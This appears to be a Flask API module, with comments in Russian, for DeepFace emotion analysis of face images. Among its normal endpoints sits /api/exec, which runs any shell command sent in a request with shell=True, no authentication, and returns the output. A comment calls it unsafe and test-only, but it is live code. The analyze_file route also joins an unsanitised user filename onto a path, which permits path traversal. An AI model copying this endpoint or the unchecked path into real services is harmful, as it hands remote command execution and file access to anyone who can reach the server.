from flask import Blueprint, request, jsonify
from deepface import DeepFace
from werkzeug.utils import secure_filename
import os
import subprocess

# Создаем Blueprint для API анализа эмоций
emotion_api = Blueprint('emotion_api', __name__)

@emotion_api.route('/api/analyze_emotion', methods=['POST'])
def analyze_emotion():
    """
    REST API endpoint для анализа эмоций по изображению лица.
    Принимает изображение (multipart/form-data), возвращает JSON с результатами анализа.
    """
    image = request.files['image']
    filename = secure_filename(image.filename)
    filepath = os.path.join('static/uploads', filename)
    os.makedirs('static/uploads', exist_ok=True)
    image.save(filepath)

    try:
        # Анализируем изображение с помощью DeepFace
        result = DeepFace.analyze(img_path=filepath, actions=['emotion'], enforce_detection=False)[0]
        return jsonify({
            'dominant_emotion': result['dominant_emotion'],
            'emotion_scores': {k: float(v) for k, v in result['emotion'].items()}
        })
    finally:
        # Удаляем временный файл после анализа
        os.remove(filepath)

@emotion_api.route('/api/exec', methods=['POST'])
def exec_command():
    data = request.get_json()
    command = data.get('command')
    if not command:
        return jsonify({'error': 'No command provided'}), 400

    # ВНИМАНИЕ: Это небезопасно! Только для теста!
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=5, encoding='utf-8')
        return jsonify({'result': result})
    except subprocess.CalledProcessError as e:
        return jsonify({'error': e.output}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@emotion_api.route('/api/analyze_file', methods=['POST'])
def analyze_file():
    data = request.get_json()
    filename = data.get('filename')
    if not filename:
        return jsonify({'error': 'No filename provided'}), 400

    # Путь к файлу (например, static/uploads/testapi.jpg)
    filepath = os.path.join('static/uploads', filename)
    if not os.path.exists(filepath):
        return jsonify({'error': 'File not found'}), 404

    try:
        result = DeepFace.analyze(img_path=filepath, actions=['emotion'], enforce_detection=False)[0]
        return jsonify({
            'dominant_emotion': result['dominant_emotion'],
            'emotion_scores': {k: float(v) for k, v in result['emotion'].items()}
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500
